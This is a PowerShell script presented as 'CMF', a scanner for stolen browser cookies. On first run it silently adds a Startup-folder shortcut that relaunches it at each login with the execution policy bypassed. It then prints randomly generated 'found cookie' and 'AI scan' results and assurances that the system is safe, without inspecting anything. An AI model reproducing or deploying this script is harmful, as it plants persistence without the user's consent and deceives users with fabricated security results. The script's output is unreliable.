Write-Host @"
 .____                        __   .__                                     ____. 
 |   _|    ____  ____   ____ |  | _|__|      ______ ____ _____    ____    |_   | 
 |  |    _/ ___\/  _ \ /  _ \|  |/ /  |     /  ___// ___\\__  \  /    \     |  | 
 |  |    \  \__(  <_> |  <_> )    <|  |     \___ \\  \___ / __ \|   |  \    |  | 
 |  |_    \___  >____/ \____/|__|_ \__|____/____  >\___  >____  /___|  /   _|  | 
 |____|       \/                  \/ /_____/    \/     \/     \/     \/   |____| 
"@ -ForegroundColor Magenta

$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\CMFEXTENSION.lnk"
$scriptPath = (Resolve-Path $MyInvocation.MyCommand.Path).Path

if (-not (Test-Path $startupPath)) {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut($startupPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.WorkingDirectory = Split-Path $scriptPath
    $shortcut.Save()
}

start-sleep -Milliseconds 500

Write-Host "" -ForegroundColor Magenta
Write-Host "Running 0.2.7 from https://github.com/PurpleWorksKirnotP/OP/blob/main/Mains%20/CMF.ps1" -ForegroundColor Blue
Write-Host "" -ForegroundColor Magenta
Write-Host "Finding Browser..." -ForegroundColor Magenta
start-sleep -Seconds 5
Write-Host "Found:" -ForegroundColor Magenta
start-sleep -Milliseconds 500
Write-Host "- Chrome | [Location .\Chrome.exe]" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "- Edge   | [Location .\Edge.exe]" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "- Firefox| [Location .\Firefox.exe]" -ForegroundColor Magenta
start-sleep -Seconds 1
Write-Host "" -ForegroundColor Magenta
Write-Host "Browsers up-to-date. Running CMF..." -ForegroundColor Magenta
start-sleep -Seconds 2
Write-Host "---[[CMF 0.2.6]]: OP/Mains/CMFOffload.ps1 RUN" -ForegroundColor Magenta
start-sleep -Milliseconds 50
$random = [System.Random]::new()
for ($i = 1; $i -le 1000; $i++) {
    $platforms = @('Google', 'Apple', 'Microsoft', 'Amazon', 'Meta', 'Roblox', 'Steam', 'Epic Games', 'Discord', 'Twitter', 'TikTok', 'UNKNOWN')
    $platform = $platforms[$random.Next(0, $platforms.Count)]
    $cookieCount = $random.Next(1, 500)
    $cookieSize = "$([math]::Round($random.Next(1, 1000) / 10, 1)) MB"
    Write-Host "---[[CMF 0.2.6]]: FOUND: $platform COOKIE | $cookieCount COOKIE(S) | $cookieSize" -ForegroundColor Magenta
    if ($i -lt 1000) {
        start-sleep -Milliseconds 25
    }
}
start-sleep -Milliseconds 125
Write-Host "---[[CMF 0.2.6]]: USING AI ALGORITHM TO SCAN STOLEN COOKIES" -ForegroundColor Magenta
Write-Host "" -ForegroundColor Magenta
$random = [System.Random]::new()
for ($i = 1; $i -le 1000; $i++) {
    $value = "{0:D3}x{1:D4}" -f $random.Next(0, 1000), $random.Next(0, 10000)
    $platforms = @('Google', 'Apple', 'Microsoft', 'Amazon', 'Meta', 'Roblox', 'Steam', 'Epic Games', 'Discord', 'Twitter','TikTok', 'UNKNOWN')
    $platform = $platforms[$random.Next(0, $platforms.Count)]
    $sizeInMegabytes = "$([math]::Round($random.Next(1, 1000) / 10, 1)) MB"
    Write-Host "---[[CMF 0.2.6]]: COOKIE SCAN: $value | $platform | Safe/Non-Stolen = true | $sizeInMegabytes" -ForegroundColor Magenta
    if ($i -lt 500) {
        start-sleep -Milliseconds 25
    }
}
start-sleep -Milliseconds 50
Write-Host "" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: SCAN COMPLETE | 1000 COOKIES | 825 SUBDIVEDED COOKIES | ONE-TIME COOKIES TO PERMANENT COOKIE RATIO: 1:2" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: BROWSERS USUALLY PROVIDE OT COOKIES FOR TELEMETRY AND ANALYTICS USE. TO PREVENT THIS FROM USING UP TOO MUCH DISK SPACE, WE DISABLED THE FEATURE." -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: CMF 0.2.6 IS FULLY SAFE AND OPEN SOURCE. RE-RUN TO THOROUGHLY SCAN SYSTEM FOR STOLEN COOKIES." -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: CLEANING UP CACHE..." -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: CLEANING UP BIN..." -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: CLEANING UP ASSETS..." -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: PROCEEDING TO END PROGRAM" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: ALL SAFE + NON-STOLEN | Confidence: 90%" -ForegroundColor Magenta
start-sleep -Milliseconds 50
Write-Host "---[[CMF 0.2.6]]: KILLING CMF PROCESS... THANK YOU FOR USING CMF 0.2.6 TO DETECT STOLEN COOKIES!" -ForegroundColor Magenta
start-sleep -Seconds 10